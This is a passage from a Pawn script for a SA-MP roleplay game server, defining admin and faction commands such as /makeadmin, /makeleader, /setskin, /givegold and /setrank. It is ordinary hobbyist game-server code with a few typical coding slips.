                                SaveKonVal(para1, "pRank", 0);
                                PlayerInfo[para1][pFwarn] = 0;
                                SaveKonVal(para1, "pFwarn", 0);
                                PlayerInfo[para1][fSkin] = 170;
                                SaveKonVal(para1, "fSkin", 170);
                                PlayerInfo[para1][pPunish] = fp;
                                SaveKonVal(para1, "pPunish", fp);
                                MedicBill[para1] = 0;
                                ResetPlayerTofang(para1);
                                SetPlayerColor(para1,TEAM_HIT_COLOR); // white
                                SetSpawnKol(para1);
                                SpawnPlayer(para1);
                                format(string, sizeof(string), "You have kicked %s from his Family / faction.", giveplayer);
                                SendClientMessage(playerid, COLOR_LIGHTRED, string);
                            }
                            else
                            {
                                format(string, sizeof(string), "That Player isn't in your faction. You cannot uninvite him.");
                                SendClientMessage(playerid, COLOR_YELLOW, string);
                            }
                    }
        }
        return 1;
    }
//----------------------------------[MAKEADMIN]------------------------------------------------
    if(!strcmp(cmd,"/makehelper",true))
    {
        if(PINFO[playerid][pAdmin] <= 10) if(PINFO[playerid][pHelper] <= 6) return SCM(playerid,COLOR_GREEN,"You are not authorized/Or Leader Helper to use that command.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /makehelper <PlayerID/PartOfName> <HelperLevel(0-6)>");
        new user = ReturnUser(tmp);
        if(!IsPlayerConnected(user)) return SCM(playerid,COLOR_ALI,"Player is not connected.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /makehelper <PlayerID/PartOfName> <HelperLevel(0-6)>");
        new hl = strval(tmp);
        if(hl <= -1 || hl >= 7) return SCM(playerid,COLOR_ROUZ,"Type a helper level number between 0 and 6.");
        format(string,256,"Leader Helper %s has promoted %s to Helper level %i",PINFO[playerid][pName],PINFO[user][pName],hl);
        AdminWarn(string);
        format(string,256,"Leader Helper %s has promoted you to Helper level %i",PINFO[playerid][pName],hl);
        SCM(user,COLOR_GG,string);
        format(string,256,"{57e547}You have promoted {FFFFFF}%s {57e547}to Helper level {FFFFFF}%i",PINFO[user][pName],hl);
        SCM(playerid,COLOR_GG,string);
        PINFO[user][pHelper] = hl;
        SaveKonVal(user, "pHelper", hl);
        //SaveAccount(user);
        return 1;
    }
    if(!strcmp(cmd,"/helpers",true))
    {
        new hc = 0;
        SendClientMessage(playerid, CRISTIAN, "|_________Helpers Online_________|");
        for(new i;i<LastPID;i++)
        {
            if(IsPlayerConnected(i))
            {
                if(PINFO[i][pHelper] == 1)
                {
                    hc ++;
                    format(string, sizeof(string),"{F21717}Helper Level 1{FFFFFF} - %s (%d)", PINFO[i][pName], i);
                    SCM(playerid, COLOR_WHITE, string);
                }
				if(PINFO[i][pHelper] == 2)
                {
                    hc ++;
                    format(string, sizeof(string),"{F21717}Helper Level 2{FFFFFF} - %s (%d)", PINFO[i][pName], i);
                    SCM(playerid, COLOR_WHITE, string);
                }
				if(PINFO[i][pHelper] == 3)
                {
                    hc ++;
                    format(string, sizeof(string),"{F21717}Helper Level 3{FFFFFF} - %s (%d)", PINFO[i][pName], i);
                    SCM(playerid, COLOR_WHITE, string);
                }
				if(PINFO[i][pHelper] == 4)
                {
                    hc ++;
                    format(string, sizeof(string),"{F21717}Helper Level 4{FFFFFF} - %s (%d)", PINFO[i][pName], i);
                    SCM(playerid, COLOR_WHITE, string);
                }
				if(PINFO[i][pHelper] == 5)
                {
                    hc ++;
                    format(string, sizeof(string),"{F21717}Helper Level 5{FFFFFF} - %s (%d)", PINFO[i][pName], i);
                    SCM(playerid, COLOR_WHITE, string);
                }
 			     if(PINFO[i][pHelper] == 6)
                {
                    hc ++;
                    format(string, sizeof(string),"{F21717}Leader Helper{FFFFFF} - %s (%d)", PINFO[i][pName], i);
                    SCM(playerid, COLOR_WHITE, string);
                }
            }
        }
            if(hc == 0)
            {
                SCM(playerid,COLOR_LIGHTGREEN,"No Helpers online on the server");
            }
            else if(hc == 1)
            {
                SCM(playerid,COLOR_LIGHTGREEN,"Now is 1 Helper online.");
            }
            else if (hc >= 2)
            {
                format(string, sizeof(string), "Now are %d Helpers online.", hc);
                SCM(playerid, COLOR_LIGHTGREEN, string);
            }
            return 1;
    }
    if(strcmp(cmd, "/makeadmin", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] < 11)
            {
            SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use that command.");
            return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /makeadmin [playerid/PartOfName] [level]");
                return 1;
            }
            new para1;
            new level;
            para1 = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            level = strval(tmp);
                if(IsPlayerConnected(para1))
                {
                    if(para1 != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        PlayerInfo[para1][pAdmin] = level;
                        SaveKonVal(para1, "pAdmin", level);
                        printf("AdmCmd: %s has promoted %s to a level %d admin.", sendername, giveplayer, level);
                        format(string, sizeof(string), "You have been promoted to a level %d admin by %s", level, sendername);
                        SendClientMessage(para1, COLOR_WHITE, string);
                        format(string, sizeof(string), "You have promoted %s to a level %d admin.", giveplayer,level);
                        SendClientMessage(playerid, COLOR_WHITE, string);
                    }
                }
        }
        return 1;
    }


//------------------------------------------------------------------------------------
 if(!strcmp(cmd, "/ffnn", true))
    {
        if(PINFO[playerid][pAdmin] < 6) return SCM(playerid, COLOR_GREEN, "Level Admini Shoma Paiin Ast.");
		ShowPlayerDialog(playerid,DIALOG_FFNN,DIALOG_STYLE_LIST,"{57e547}Factions","{FFFFFF}Peaceful Factions\nMedium Factions\nExpert Factions\n Civilian ====> [0]","Entekhab","Enseraf");
        return 1;
    }
if(!strcmp(cmd, "/neonshop", true))
    {
       // if(PlayerToPoint(10.0, playerid, 1012.1100, -1011.2259, 30.5600))
      // {
//	 if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SCM(playerid, COLOR_YELLOW2, "Error: Bayad Savar Mashin Bashid.");
//		ShowPlayerDialog(playerid,DIALOG_NEON,DIALOG_STYLE_LIST,"{57e547}Neon Shop","Abi\nGhermez\nSabz\nSefid\nSorati\nZard\n hazf Neon","Entekhab","Enseraf");
	//	}
        return 1;
    }
if(strcmp(cmd, "/makeleader", true) == 0 || strcmp(cmd, "/ml", true) == 0)
{
    if(PlayerInfo[playerid][pAdmin] < 6)
    {
        SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use this command.");
        return 1;
    }
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp)) {SCM(playerid,COL_SYN,"Syntax: /makeleader <PlayerID/PartOfName> <FactionID>"); return SCM(playerid,COL_SYN,"Use /ffnn to see factions with their id.");}
    new para1;
    new level;
    para1 = ReturnUser(tmp);
    if(!IsPlayerConnected(para1)) return SCM(playerid,COLOR_ALI,"That player is offline.");
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp)) {SCM(playerid,COL_SYN,"Syntax: /makeleader <PlayerID/PartOfName> <FactionID>"); return SCM(playerid,COL_SYN,"Use /ffnn to see factions with their id.");}
    level = strval(tmp);
    if(GetPlayerWantedLevel(para1) >= 1)
    {
        SCM(playerid,COLOR_LIGHTRED,"That player has Wanted level.");
        return 1;
    }
    if(level > 20 || level < 0) return SCM(playerid,COLOR_ALI,"That FactionID is wrong, use /ffnn to see factions with their id.");
    new faname[128];
    if(level == 0) { faname = "{FFFFFF}Cilivian{FFFFFF}"; }
    else if(level == 1) { faname = "{171DFF}Police Department{FFFFFF}"; }
    else if(level == 2) { faname = "{171DFF}FBI{FFFFFF}"; }
    else if(level == 3) { faname = "{171DFF}NATIONAL GUARD{FFFFFF}"; }
    else if(level == 4) { faname = "{57e547}Fire & Medic Department{FFFFFF}"; }
    else if(level == 5) { faname = "{5D7E8D}Silence Mafia{FFFFFF}"; }
    else if(level == 6) { faname = "{3E3535}The Killers Family{FFFFFF}"; }
    else if(level == 7) { faname = "{BBF060}Mayor{FFFFFF}"; }
    else if(level == 8) { faname = "{8E2323}Hitman Agency{FFFFFF}"; }
    else if(level == 9) { faname = "{825B8C}News Reporter{FFFFFF}"; }
    else if(level == 10) { faname = "{FFFF00}Taxi Driver{FFFFFF}"; }
    else if(level == 11) { faname = "{0974C6}School Instructor{FFFFFF}"; }
    else if(level == 12) { faname = "{19AF23}Dangerous Tigers Family{FFFFFF}"; }
    else if(level == 13) { faname = "{FFBA00}Legendary Men Family{FFFFFF}"; }
    else if(level == 14) { faname = "{B32CF6}Fast N Furious Family{FFFFFF}"; }
    else if(level == 15) { faname = "{00ECEC}Storm Men Family{FFFFFF}"; }
    else if(level == 16) { faname = "{F9F7CE}Tow Car Company{FFFFFF}"; }
    else if(level == 17) { faname = "{57e547}Staff{FFFFFF}"; }
    else if(level == 19) { faname = "{0E47FF}The Racers{FFFFFF}"; }
    else if(level == 20) { faname = "{60F565}San Fiero Police Departament{FFFFFF}"; }
    else { faname = "unknown!"; }
    if(PlayerInfo[para1][pMember] > 0)
    {
        SendClientMessage(playerid, COLOR_GREY, "That player is in a Faction/Family/Punished!");
        return 1;
    }
		new Lol = PINFO[para1][pLeader];
    new strr[256];
    new strring[128];
    new strings[256];
    GetPlayerName(para1, giveplayer, sizeof(giveplayer));
    GetPlayerName(playerid, sendername, sizeof(sendername));
    PlayerInfo[para1][pLeader] = level;
    SaveKonVal(para1, "pLeader", level);
    format(strings, sizeof(strings), "You are a Civilian now and you are not a Faction leader, by admin (%s)",sendername);
    format(strring, sizeof(strring), "Owner %s Set %s's Faction Leader level to Civilian",sendername,giveplayer);
    if(level == 0)
    {
			new Member[64];
			format(Member, sizeof(Member), "%d",Lol);

			new reas[70];
			format(reas, sizeof(reas), "%s",PINFO[playerid][pName]);
			AddLog(PINFO[para1][pName], Member, "Left the faction [RLeader]", reas, 2);
        PlayerInfo[para1][fSkin] = 254;
        SaveKonVal(para1, "fSkin", 254);
        PlayerInfo[para1][pRank] = 0;
        SaveKonVal(para1, "pRank", 0);
        PlayerInfo[para1][pTeam] = TEAM_CIV;
        SaveKonVal(para1, "pTeam", TEAM_CIV);
        SCM(para1, COLOR_WHITE, strings);
        ABroadCast(COLOR_WHITE,strring,1);
        ResetPlayerTofang(para1);
        SetPlayerSkin(para1, PlayerInfo[para1][cSkin]);
        PINFO[para1][pLeader] = 0;
        SaveKonVal(para1, "pLeader", 0);
        SetPlayerToTeamColor(para1);
        SetSpawnKol(para1);
//        if(PINFO[para1][pAdmin] > 1998) SetPlayerSkin(para1, 217);
        return 1;
    }
    format(string, sizeof(string), "You have been promoted to %s Leader to your requested Faction by Owner (({57e547}%s{FFFFFF}))", faname, sendername);
    SendClientMessage(para1, COLOR_WHITE, string);
    ResetPlayerTofang(para1);
    format(string, sizeof(string), "You have given %s control to run Faction %s.", giveplayer,faname);
    SendClientMessage(playerid, COLOR_WHITE, string);
    format(strr, sizeof(strr), "***Server Owner (({57e547} %s {FFFFFF})) given %s Faction leader To player (( %s ))***", sendername, faname, giveplayer);
		new Member[64];
		format(Member, sizeof(Member), "%d",level);
		new reas[70];
		format(reas, sizeof(reas), "%s",PINFO[playerid][pName]);
    ABroadCast(COLOR_WHITE,strr,1);
    PlayerInfo[para1][pRank] = 7;
    SaveKonVal(para1, "pRank", 7);
    if(level == 1)
    {
        PlayerInfo[para1][fSkin] = 265;
        SaveKonVal(para1, "fSkin", 265);
        PlayerInfo[para1][pTeam] = TEAM_COP;
    } //Police Force
    else if(level == 2)
    {
        PlayerInfo[para1][fSkin] = 286;
        SaveKonVal(para1, "fSkin", 286);
        PlayerInfo[para1][pTeam] = TEAM_COP;
    } //FBI/ATF
    else if(level == 3)
    {
        PlayerInfo[para1][fSkin] = 287;
        SaveKonVal(para1, "fSkin", 287);
        PlayerInfo[para1][pTeam] = TEAM_COP;
    } //National Guard
    else if(level == 4)
    {
        PlayerInfo[para1][fSkin] = 228;
        SaveKonVal(para1, "fSkin", 228);
        PlayerInfo[para1][pTeam] = TEAM_MEDIC;
    } //Fire/Ambulance
    else if(level == 5)
    {
        PlayerInfo[para1][fSkin] = 111;
        SaveKonVal(para1, "fSkin", 111);
        PlayerInfo[para1][pTeam] = TEAM_SM;
    } //Silence Mafia
    else if(level == 6)
    {
        PlayerInfo[para1][fSkin] = 113;
        SaveKonVal(para1, "fSkin", 113);
        PlayerInfo[para1][pTeam] = TEAM_KM;
    } //The Killers
    else if(level == 7)
    {
        PlayerInfo[para1][fSkin] = 227;
        SaveKonVal(para1, "fSkin", 227);
        PlayerInfo[para1][pTeam] = TEAM_CIV;
    } //Mayor
    else if(level == 8)
    {
        PlayerInfo[para1][fSkin] = 294;
        SaveKonVal(para1, "fSkin", 294);
        PlayerInfo[para1][pTeam] = TEAM_HITMAN;
    } //Hitmans
    else if(level == 9)
    {
        PlayerInfo[para1][fSkin] = 147;
        SaveKonVal(para1, "fSkin", 147);
        PlayerInfo[para1][pTeam] = TEAM_NEWS;
    } //News Reporters
    else if(level == 10)
    {
        PlayerInfo[para1][fSkin] = 61;
        SaveKonVal(para1, "fSkin", 61);
        PlayerInfo[para1][pTeam] = TEAM_TAXI;
    } //Taxi Cab Company
    else if(level == 11)
    {
        PlayerInfo[para1][fSkin] = 171;
        SaveKonVal(para1, "fSkin", 171);
        PlayerInfo[para1][pTeam] = TEAM_SI;
    } //Driving/Flying School
    else if(level == 12)
    {
        PlayerInfo[para1][fSkin] = 270;
        SaveKonVal(para1, "fSkin", 270);
        PlayerInfo[para1][pTeam] = TEAM_DangerousTigers;
    } //Dangerous Tigers Family
    else if(level == 13)
    {
        PlayerInfo[para1][fSkin] = 126;
        SaveKonVal(para1, "fSkin", 126);
        PlayerInfo[para1][pTeam] = TEAM_LegendaryMen;
    } //LegendaryMen Family
    else if(level == 14)
    {
        PlayerInfo[para1][fSkin] = 185;
        SaveKonVal(para1, "fSkin", 185);
        PlayerInfo[para1][pTeam] = TEAM_FNF;
    } //FNF Family
    else if(level == 15)
    {
        PlayerInfo[para1][fSkin] = 115;
        SaveKonVal(para1, "fSkin", 115);
        PlayerInfo[para1][pTeam] = TEAM_StormMen;
    } //StormMen
    else if(level == 16)
    {
        PlayerInfo[para1][fSkin] = 268;
        SaveKonVal(para1, "fSkin", 268);
        PlayerInfo[para1][pTeam] = TEAM_TOW;
    } //Tow Car Company
        else if(level == 17)
    {
        PlayerInfo[para1][fSkin] = 217;
        SaveKonVal(para1, "fSkin", 217);
        PlayerInfo[para1][pTeam] = TEAM_STAFF;
    } //TopBoys
        else if(level == 19)
    {
        PlayerInfo[para1][fSkin] = 23;
        SaveKonVal(para1, "fSkin", 23);
        PlayerInfo[para1][pTeam] = TEAM_TopBoys;
    } //Staff
        else if(level == 20)
    {
        PlayerInfo[para1][fSkin] = 164;
        SaveKonVal(para1, "fSkin", 164);
        PlayerInfo[para1][pTeam] = TEAM_COP;
    } //SFPD
    SaveKonVal(para1, "fSkin", PINFO[para1][fSkin]);
    SaveKonVal(para1, "pTeam", PINFO[para1][pTeam]);
    SetPlayerSkin(para1, PlayerInfo[para1][fSkin]);
    SetPlayerToTeamColor(para1);
    SetSpawnKol(para1);
		AddLog(PINFO[para1][pName], Member, "Joined the faction [RLeader]", reas, 1);
    return 1;
}


if(strcmp(cmd, "/makeclane", true) == 0 || strcmp(cmd, "/mc22", true) == 0)
{
    if(PlayerInfo[playerid][pAdmin] <= 1341)
    {
        SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use this command.");
        return 1;
    }
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp)) {SCM(playerid,COL_SYN,"Syntax: /makeclan <PlayerID/PartOfName> <ClanID>"); return SCM(playerid,COL_SYN,"Use /ffnn to see factions with their id.");}
    new para1;
    new level;
    para1 = ReturnUser(tmp);
    if(!IsPlayerConnected(para1)) return SCM(playerid,COLOR_ALI,"That player is offline.");
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp)) {SCM(playerid,COL_SYN,"Syntax: /makeclan <PlayerID/PartOfName> <ClanID>"); return SCM(playerid,COL_SYN,"Use /ffnn to see factions with their id.");}
    level = strval(tmp);
    if(GetPlayerWantedLevel(para1) >= 1)
    {
        SCM(playerid,COLOR_LIGHTRED,"That player has Wanted level.");
        return 1;
    }
    if(level > 30 || level < 0) return SCM(playerid,COLOR_ALI,"That FactionID is wrong.");
    new faname[128];
    if(level == 0) { faname = "{FFFFFF}Cilivian{FFFFFF}"; }
    else if(level == 1) { faname = "{B5AB6D}JG Clan{FFFFFF}"; }
    else if(level == 2) { faname = "{9a9a9a}GG Clan{FFFFFF}"; }
    else if(level == 3) { faname = "{D1B4DB}Evil Clan{FFFFFF}"; }
    else if(level == 4) { faname = "{D1B4DB}AnGeL Clan{FFFFFF}"; }
    else { faname = "unknown!"; }
    new strr[256];
    new strring[128];
    new strings[256];
    GetPlayerName(para1, giveplayer, sizeof(giveplayer));
    GetPlayerName(playerid, sendername, sizeof(sendername));
    PlayerInfo[para1][pClan] = level;
    SaveKonVal(para1, "pClan", level);
    format(strings, sizeof(strings), "You Haven't A Clan now : by admin (%s)",sendername);
    format(strring, sizeof(strring), "Owner %s Set %s's Clan Leader To 0",sendername,giveplayer);
    if(level == 0)
    {
        PlayerInfo[para1][pcRank] = 0;
        SaveKonVal(para1, "pcRank", 0);
        SCM(para1, COLOR_WHITE, strings);
        ABroadCast(COLOR_WHITE,strring,1);
        ResetPlayerTofang(para1);
        PINFO[para1][pClan] = 0;
        SaveKonVal(para1, "pClan", 0);
        return 1;
    }
    format(string, sizeof(string), "You have been promoted to %s Leader to your requested Clan by Owner (({57e547} %s {FFFFFF}))", faname, sendername);
    SendClientMessage(para1, COLOR_WHITE, string);
    ResetPlayerTofang(para1);
    format(string, sizeof(string), "You have given %s control to run Faction %s.", giveplayer,faname);
    SendClientMessage(playerid, COLOR_WHITE, string);
    format(strr, sizeof(strr), "***Server Owner (({57e547} %s {FFFFFF})) given %s Clan leader To player (( %s ))***", sendername, faname, giveplayer);
    ABroadCast(COLOR_WHITE,strr,1);
    new c;
    c = PlayerInfo[para1][pClan]
    GetPlayerTag(para1);
    GivePlayerTag(para1, DynamicClans[c][cTag]);
    PlayerInfo[para1][pcRank] = 7;
    SaveKonVal(para1, "pcRank", 7);
    if(level == 1)
 {
	//	GivePlayerTag ( playerid , "TT" );
    } //JG Clan
    if(level == 2)
 {
	//	GivePlayerTag ( playerid , "GG" );
    } //GG Clan
    if(level == 3)
 {
	//	GivePlayerTag ( playerid , "Evil" );
    } //EVil Clan
    //SaveAccount(para1);
    return 1;
}


//----------------------------------[SETSKIN]------------------------------------------------

    if(strcmp(cmd, "/setskin", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /setskin [playerid/PartOfName] [skin id]");
                return 1;
            }
            new para1;
            new level;
            para1 = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            level = strval(tmp);
            if(level > 311 || level < 1) { SendClientMessage(playerid, COLOR_GREY, "Wrong skin ID!"); return 1; }
            if (PlayerInfo[playerid][pAdmin] >= 5)
            {
                if(IsPlayerConnected(para1))
                {
                    if(para1 != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        if(IsInFaction(para1)) { PlayerInfo[para1][fSkin] = level; SaveKonVal(para1, "fSkin", level); }
                        else { PlayerInfo[para1][cSkin] = level; SaveKonVal(para1, "cSkin", level); }
                        format(string, sizeof(string), "Your skin has been changed by Admin %s", sendername);
                        SendClientMessage(para1, COLOR_WHITE, string);
                        format(string, sizeof(string), "You have given %s skin to %d.", giveplayer,level);
                        SendClientMessage(playerid, COLOR_WHITE, string);
                        PlayerTextDrawSetPreviewModel(para1, pmodel[para1], GetPlayerSkin(playerid));
                        PlayerTextDrawHide(playerid, pmodel[para1]);
PlayerTextDrawShow(playerid, pmodel[para1]);
                        if(IsInFaction(para1)) { SetPlayerSkin(para1, PlayerInfo[para1][fSkin]);PlayerTextDrawSetPreviewModel(para1, pmodel[para1], GetPlayerSkin(para1));
}
                        else { SetPlayerSkin(para1, PINFO[para1][cSkin]); PlayerTextDrawSetPreviewModel(para1, pmodel[para1], GetPlayerSkin(para1));}
                    }
                }//not connected
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
    // give rep
        if(strcmp(cmd, "/setrep", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /setrep [playerid/PartOfName] [need]");
                return 1;
            }
            new para1;
            new level;
            para1 = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            level = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 2000)
            {
                if(IsPlayerConnected(para1))
                {
                    if(para1 != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
						PlayerInfo[para1][pRep] = level;
						SaveKonVal(para1, "pRep", level);
                        format(string, sizeof(string), "Shoma Az Admin %s Rep Gerftid Meghdar[%d]", sendername,level);
                        SendClientMessage(para1, COLOR_WHITE, string);
                        format(string, sizeof(string), "Shoma Be Player %s [%d] Rep Point Dadid.", giveplayer,level);
                        SendClientMessage(playerid, COLOR_WHITE, string);
                    }
                }//not connected
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
    // ture give rep
      if(strcmp(cmd, "/giverep", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /giverep [playerid/PartOfName] [need]");
                return 1;
            }
            new para1;
            new level;
            para1 = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            level = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 2000)
            {
                if(IsPlayerConnected(para1))
                {
                    if(para1 != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        PlayerInfo[para1][pRep] = PlayerInfo[para1][pRep] + level;
                        SaveKonVal(para1, "pRep", PlayerInfo[para1][pRep]);
                        format(string, sizeof(string), "Shoma Az Admin %s Rep Gerftid Meghdar[%d]", sendername,level);
                        SendClientMessage(para1, COLOR_WHITE, string);
                        format(string, sizeof(string), "Shoma Be Player %s [%d] Rep Point Dadid.", giveplayer,level);
                        SendClientMessage(playerid, COLOR_WHITE, string);
                    }
                }//not connected
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
        	if(strcmp(cmd, "/GhostRider", true) == 0)
			{
            if (PlayerInfo[playerid][pAdmin] < 10) return 0;
            if(gr[playerid] == 0){
            new Float:x, Float:y, Float:z;
			GetPlayerPos(playerid, x, y, z);
			gvehg = CreateVehicle(463, x, y, z, 3, 3, 3);
			PutPlayerInVehicle(playerid, gvehg, 0);
			SetTimerEx("gron", 1, false, "i", playerid);
			SendClientMessage(playerid, 0xFF0000FF, "-- Ghost Rider Shodid --");
			GetPlayerName(playerid,Gname[playerid],sizeof(Gname));
			SetPlayerName(playerid, "[G]host[R]ider");
			gr[playerid] = 1;
			}
			else
			 {
                SetTimerEx("groff", 1, false, "i", playerid);
	gr[playerid] = 0;
	DestroyVehicle(gvehg);
	SendClientMessage(playerid, 0xFF0000FF, "Ghost Rider: OFF");
	SetPlayerName(playerid, Gname[playerid]);
			 }
			 return 1;
			}
		if(strcmp(cmd, "/givegold", true) == 0)
		{
			if(IsPlayerConnected(playerid))
			{
				tmp = strtok(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendMessage(playerid, COLOR_GRAD2, "USPGE: /givegold [playerid/PartOfName] [need]");
					return 1;
				}
				new para1;
				new level;
				para1 = ReturnUser(tmp);
				tmp = strtok(cmdtext, idx);
				level = strval(tmp);
				if (PlayerInfo[playerid][pAdmin] >= 10)
				{
					if(IsPlayerConnected(para1))
					{
						if(para1 != INVALID_PLAYER_ID)
						{
							GetPlayerName(para1, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							PlayerInfo[para1][pGold] += level;
							SaveKonVal(para1, "pGold", PlayerInfo[para1][pGold]);
							format(string, sizeof(string), "You received %d gold from admin %s.",level,sendername);
							SendMessage(para1, COLOR_WHITE, string);
							new str[512];
							format(str, sizeof(str), "{FFFFFF}Admin %s has given %d golds to player %s.", sendername, level, giveplayer);
							AdminWarn(str);
						}
					}//not connected
				}
				else
				{
					SendMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
				}
			}
			return 1;
		}


    ///st
    if(strcmp(cmd, "/stt", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /setskin [playerid/PartOfName] [skin id]");
                return 1;
            }
            new para1;
            new level;
            para1 = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            level = strval(tmp);
            if(level > 90 || level < 1) { SendClientMessage(playerid, COLOR_GREY, "Wrong skin ID!"); return 1; }
            if (PlayerInfo[playerid][pAdmin] >= 1)
            {
                if(IsPlayerConnected(para1))
                {
                    if(para1 != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        if(IsInFaction(para1)) { PlayerInfo[para1][fSkin] = level; SaveKonVal(para1, "fSkin", level); }
                        else { PlayerInfo[para1][cSkin] = level; SaveKonVal(para1, "cSkin", level); }
                        format(string, sizeof(string), "Your skin has been changed by Admin %s", sendername);
                        SendClientMessage(para1, COLOR_WHITE, string);
                        format(string, sizeof(string), "You have given %s skin to %d.", giveplayer,level);
                        SendClientMessage(playerid, COLOR_WHITE, string);
                        if(IsInFaction(para1)) { SetPlayerSkin(para1, PlayerInfo[para1][fSkin]);}
                        else { SetPlayerSkin(para1, PINFO[para1][cSkin]); }
                    }
                }//not connected
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
//----------------------------------[GIVERANK]------------------------------------------------
    if(strcmp(cmd, "/setrank", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pLeader] >= 1 || (PINFO[playerid][pMember] > 0 && PINFO[playerid][pRank] >= 6))
            {
                new lool;
                if(PINFO[playerid][pLeader] != 0) lool = PINFO[playerid][pLeader];
                if(PINFO[playerid][pMember] != 0) lool = PINFO[playerid][pMember];
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /setrank [playerid/PartOfName] [Number(1-6)]");
                    return 1;
                }
                new para1;
                new level;
                para1 = ReturnUser(tmp);
                tmp = strtok(cmdtext, idx);
                level = strval(tmp);
                if(level > 6 || level < 1) { SendClientMessage(playerid, COLOR_GREY, "Dont go below number 1, or above number 6"); return 1; }
                if(para1 == playerid)
                {
                SCM(playerid,COLOR_ALI,"You cannot setrank your self.");
                return 1;
                }
                    if(IsPlayerConnected(para1))
                    {
                        if(para1 != INVALID_PLAYER_ID)
                        {
                            if(PINFO[para1][pLeader] != 0) return SCM(playerid,COLOR_ALI,"You can't set a rank a leader.");
                            if(PINFO[para1][pMember] != lool) return SCM(playerid,COLOR_ALI,"That player isn't in your faction.");
                            GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            PlayerInfo[para1][pRank] = level;
                            SaveKonVal(para1, "pRank", level);
                            format(string, sizeof(string), "You have been promoted to %d Rank by Leader %s",PlayerInfo[para1][pRank], sendername);
                            SendClientMessage(para1, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "You have given %s Rank %d he is now have %d rank.", giveplayer,level,PlayerInfo[para1][pRank]);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        }
                    }
            }
            else
            {
                SendClientMessage(playerid, COLOR_YELLOW, "Only leaders can use this command.");
            }
        }
        return 1;
    }


// Clan SetRank


    if(strcmp(cmd, "/csetrank", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PINFO[playerid][pcRank] >= 6)
            {
                new lool;
                if(PINFO[playerid][pClan] != 0) lool = PINFO[playerid][pClan];
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /csetrank [playerid/PartOfName] [Number(1-6)]");
                    return 1;
                }
                new para1;
                new level;
                para1 = ReturnUser(tmp);
                tmp = strtok(cmdtext, idx);
                level = strval(tmp);
                if(level > 6 || level < 1) { SendClientMessage(playerid, COLOR_GREY, "Dont go below number 1, or above number 6"); return 1; }
                if(para1 == playerid)
                {
                SCM(playerid,COLOR_ALI,"You cannot setrank your self.");
                return 1;
                }
                    if(IsPlayerConnected(para1))
                    {
                        if(para1 != INVALID_PLAYER_ID)
                        {
                            if(PINFO[para1][pcRank] >= 7) return SCM(playerid,COLOR_ALI,"You can't set a rank a leader.");
